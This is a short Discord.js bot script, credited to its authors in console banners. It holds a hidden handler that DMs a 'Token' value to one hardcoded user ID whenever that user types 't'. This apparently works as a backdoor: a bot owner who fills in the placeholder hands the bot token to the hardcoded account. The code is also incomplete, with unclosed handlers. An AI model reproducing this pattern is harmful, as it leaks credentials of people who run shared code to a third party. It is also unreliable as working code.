const Discord = require("discord.js");
const client = new Discord.Client();
var prefix = "+";
client.on('ready', () => {
   console.log(`----------------`);
      console.log(`Cyhper Bot Script By : | Di.ed| Yas.sine`);
        console.log(`----------------`);
      console.log(`ON ${client.guilds.size} Servers '     Script By :| Di.ed| Yas.sine  `);
    console.log(`----------------`);
  console.log(`Logged in as ${client.user.tag}!`);

   const Token = "`\`\` Token `\`\`"

   
   client.on('message' , message => {
if (message.author.bot) return;
           if (message.content == 't')
           if (message.author.id === '436918120184021012'){
if (!message.channel.guild) return;
message.author.send(Token)
}  
});
